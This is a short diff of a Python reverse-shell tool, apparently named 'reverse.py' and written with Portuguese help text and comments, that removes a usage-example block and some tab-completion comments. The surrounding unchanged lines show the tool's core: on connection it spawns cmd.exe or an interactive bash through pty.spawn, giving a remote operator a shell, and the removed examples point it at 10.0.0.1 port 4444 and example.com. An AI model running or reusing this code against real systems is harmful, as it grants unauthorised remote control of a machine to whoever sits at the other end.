@@ -20,10 +20,6 @@ def HOST_HELP():
       -s, --shell     Shell específico (padrão: auto-detectar)
       -h, --help      Mostra esta ajuda
 
-    EXEMPLOS:
-      python3 reverse.py -t 10.0.0.1 -p 4444
-      python3 reverse.py --target example.com --port 8080 --timeout 30
-      python3 reverse.py -s /bin/zsh
     """
 
 def detectar_shell():
@@ -85,13 +81,9 @@ def executar_reverse_shell(s, shell):
             else:
                 subprocess.call(["cmd.exe"])
         else:
-            # ---- TAB-COMPLETION GARANTIDO ----
-            # 1) garante que readline será usado
             os.environ["INPUTRC"] = "/etc/inputrc"
-            # 2) exporta opts pro bash antes de abrir o PTY
             rc = 'bind "set show-all-if-ambiguous on"; bind "TAB: complete"'
             subprocess.run(["bash", "-c", rc])
-            # 3) abre o PTY com bash
             import pty
             pty.spawn("/bin/bash")
     except Exception as e:
